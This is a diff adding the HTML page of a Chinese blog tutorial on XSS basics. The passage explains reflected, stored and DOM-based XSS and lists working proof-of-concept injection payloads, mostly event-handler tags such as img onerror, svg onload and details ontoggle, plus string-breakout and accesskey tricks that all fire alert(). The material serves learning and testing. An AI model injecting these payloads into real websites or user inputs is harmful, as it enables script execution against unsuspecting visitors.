@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>XSS基础学习 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, XSS' />
+  <meta itemprop="name" content="XSS基础学习">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="246">
+  <meta itemprop="keywords" content="OWASP,XSS"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/xss/123/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="XSS基础学习">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="XSS">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="XSS基础学习">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/xss/123/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/xxe/127/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/xss/124/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "XSS基础学习",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/xss\/123\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, XSS","wordcount":  246 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/xss\/123\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">XSS基础学习</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>XSS基础学习</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="246 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到==更高的权限==（如执行一些操作）、==私密网页内容==、==会话和cookie==等各种内容。</p>
+<blockquote>
+<p>onload：当文档加载完成后运行 JavaScript 脚本</p>
+<p>onerror：如果在加载图片时发生错误则执行 JavaScript</p>
+<p>autofocus：在页面加载时自动获得焦点</p>
+<p>onfocus：当输入域获得焦点时运行脚本</p>
+<p>onblur ：在元素失去焦点时触发。</p>
+<p>ontoggle：当 <!-- raw HTML omitted --> 元素在打开或关闭时执行 JavaScript</p>
+<p>onscroll：滚动元素的滚动条时运行的脚本</p>
+<p>onclick: 点击时触发</p>
+<p>onchange：当用户改变input输入框内容时执行一段Javascript代码</p>
+<p>onmouseover：鼠标指针移动到元素上后执行一段Javascript代码</p>
+</blockquote>
+<blockquote>
+<p>当HTML页面有多个元素时，可以通过accesskey属性指定激活该元素的快捷键，这样用户通过键盘快捷键就可以激活对应的HTML元素。</p>
+<p>payload</p>
+<p>?&lsquo;accesskey=&lsquo;x&rsquo;onclick=&lsquo;alert(1)</p>
+<p>?%27accesskey=%27x%27onclick=%27alert(1)</p>
+<p>要在自己身上触发漏洞利用，请按以下组合键之一：</p>
+<p>在Windows上：ALT + SHIFT + X
+在Mac操作系统上：CTRL + ALT + X
+在Linux上：Alt + X</p>
+</blockquote>
+<p><a href="https://blog.csdn.net/qq_29277155/article/details/51320064"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/qq_29277155/article/details/51320064</a></p>
+<p><a href="https://xz.aliyun.com/t/4067#toc-21"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/4067#toc-21</a></p>
+<blockquote>
+<p>如果XSS上下文在一个带引号的字符串文字中，通常可以==跳出字符串直接执行JavaScript==。必须按照XSS上下文修复脚本，因为其中的任何语法错误都将阻止整个脚本执行。</p>
+<p>以下是一些拆分字符串文字的有用方法：</p>
+<p>&lsquo;-alert(document.domain)-&rsquo;</p>
+<p>&lsquo;;alert(document.domain)//</p>
+</blockquote>
+<h5 id="常用攻击手段" class="heading-element"><span>0.0.0.1  常用攻击手段</span>
+  <a href="#%e5%b8%b8%e7%94%a8%e6%94%bb%e5%87%bb%e6%89%8b%e6%ae%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6be9d">1.</span><span style="color:#58a1dd">盗用cookie，获取敏感信息。</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2.</span><span style="color:#58a1dd">利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3.</span><span style="color:#58a1dd">利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4.</span><span style="color:#58a1dd">利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">5.</span><span style="color:#58a1dd">在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</span></span></span></code></pre></div><h6 id="反射型" class="heading-element"><span>0.0.0.1.1  反射型</span>
+  <a href="#%e5%8f%8d%e5%b0%84%e5%9e%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>无法持久化存储，只能诱惑别人点你构造好的链接</p>
+<pre tabindex="0"><code>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。
+反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</code></pre><h6 id="存储型" class="heading-element"><span>0.0.0.1.2  存储型</span>
+  <a href="#%e5%ad%98%e5%82%a8%e5%9e%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>持久化存储到服务器数据库里，谁访问到谁就中招</p>
+<pre tabindex="0"><code>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。
+此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</code></pre><h6 id="dom型" class="heading-element"><span>0.0.0.1.3  DOM型</span>
+  <a href="#dom%e5%9e%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>反射性也是要走后端的，DOM型是纯前端</p>
+<pre tabindex="0"><code>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</code></pre><h5 id="无任何过滤情况下" class="heading-element"><span>0.0.0.2  无任何过滤情况下</span>
+  <a href="#%e6%97%a0%e4%bb%bb%e4%bd%95%e8%bf%87%e6%bb%a4%e6%83%85%e5%86%b5%e4%b8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>####### <code>&lt;scirpt&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">scirpt</span>&gt;alert(&#34;xss&#34;);&lt;/<span style="color:#58a1dd">script</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;img&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">img</span> <span style="color:#58a1dd">src</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span> <span style="color:#58a1dd">onerror</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;input&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">onfocus</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;alert(&#39;xss&#39;);&#34;</span>&gt;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>竞争焦点，从而触发onblur事件
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">onblur</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;)</span> <span style="color:#58a1dd">autofocus</span>&gt;&lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">autofocus</span>&gt;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">onfocus</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;alert(&#39;xss&#39;);&#34;</span> <span style="color:#58a1dd">autofocus</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;details&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">details</span> <span style="color:#58a1dd">ontoggle</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;alert(&#39;xss&#39;);&#34;</span>&gt;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>使用open属性触发ontoggle事件，无需用户去触发
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">details</span> <span style="color:#58a1dd">open</span> <span style="color:#58a1dd">ontoggle</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;alert(&#39;xss&#39;);&#34;</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;svg&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">svg</span> <span style="color:#58a1dd">onload</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;select&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">select</span> <span style="color:#58a1dd">onfocus</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(1)</span>&gt;&lt;/<span style="color:#58a1dd">select</span>&gt;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">select</span> <span style="color:#58a1dd">onfocus</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(1)</span> <span style="color:#58a1dd">autofocus</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;iframe&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">iframe</span> <span style="color:#58a1dd">onload</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span>&gt;&lt;/<span style="color:#58a1dd">iframe</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;video&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">video</span>&gt;&lt;<span style="color:#58a1dd">source</span> <span style="color:#58a1dd">onerror</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;alert(1)&#34;</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;audio&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">audio</span> <span style="color:#58a1dd">src</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">x</span>  <span style="color:#58a1dd">onerror</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;body&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">body</span>/<span style="color:#58a1dd">onload</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span>&gt;</span></span></code></pre></div><p>####### <code>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">body</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">onscroll</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">br</span>&gt;&lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">autofocus</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;textarea&gt;</code></p>
